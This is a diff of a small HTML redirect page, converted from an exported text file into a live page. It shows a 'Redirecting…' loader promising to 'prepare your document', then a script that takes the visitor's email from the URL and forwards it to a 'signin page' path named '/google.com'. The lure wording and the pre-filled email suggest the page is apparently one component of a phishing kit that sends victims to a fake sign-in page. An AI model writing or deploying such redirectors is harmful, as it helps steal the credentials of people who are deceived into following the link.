@@ -1,43 +1,48 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta http-equiv="Content-Style-Type" content="text/css">
-  <title></title>
-  <meta name="Generator" content="Cocoa HTML Writer">
-  <meta name="CocoaVersion" content="2685.3">
-  <style type="text/css">
-    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
-    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirecting…</title>
+  <style>
+    /* Simple loader style */
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      margin: 0;
+    }
+    .loader {
+      text-align: center;
+    }
   </style>
 </head>
 <body>
-<p class="p1">&lt;!DOCTYPE html&gt;</p>
-<p class="p1">&lt;html&gt;</p>
-<p class="p1">&lt;head&gt;</p>
-<p class="p1"><span class="Apple-converted-space">  </span>&lt;meta charset="UTF-8"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">  </span>&lt;title&gt;Redirecting…&lt;/title&gt;</p>
-<p class="p1"><span class="Apple-converted-space">  </span>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">  </span>&lt;script&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>const params = new URLSearchParams(window.location.search);</p>
-<p class="p1"><span class="Apple-converted-space">    </span>const email = params.get('email');</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>// CHANGE THIS TO YOUR REAL LANDING PAGE</p>
-<p class="p1"><span class="Apple-converted-space">    </span>const targetPage = "google.com";</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>if (email) {</p>
-<p class="p1"><span class="Apple-converted-space">      </span>window.location.replace(</p>
-<p class="p1"><span class="Apple-converted-space">        </span>targetPage + "?email=" + encodeURIComponent(email)</p>
-<p class="p1"><span class="Apple-converted-space">      </span>);</p>
-<p class="p1"><span class="Apple-converted-space">    </span>} else {</p>
-<p class="p1"><span class="Apple-converted-space">      </span>window.location.replace(targetPage);</p>
-<p class="p1"><span class="Apple-converted-space">    </span>}</p>
-<p class="p1"><span class="Apple-converted-space">  </span>&lt;/script&gt;</p>
-<p class="p1">&lt;/head&gt;</p>
-<p class="p1">&lt;body&gt;</p>
-<p class="p1"><span class="Apple-converted-space">  </span>Redirecting…</p>
-<p class="p1">&lt;/body&gt;</p>
-<p class="p1">&lt;/html&gt;</p>
+  <div class="loader">
+    <h2>Redirecting…</h2>
+    <p>Please wait while we prepare your document.</p>
+  </div>
+
+  <script>
+    // 1️⃣ Grab the email from the redirect URL
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get('email');
+
+    // 2️⃣ Target landing page
+    const landingPage = '/google.com'; // Change if your file is in a subfolder
+
+    // 3️⃣ Redirect after short delay (optional loader effect)
+    setTimeout(() => {
+      if (email) {
+        // Pass email in URL to signin page
+        window.location.href = landingPage + '?email=' + encodeURIComponent(email);
+      } else {
+        window.location.href = landingPage;
+      }
+    }, 1000); // 1 second loader
+  </script>
 </body>
 </html>
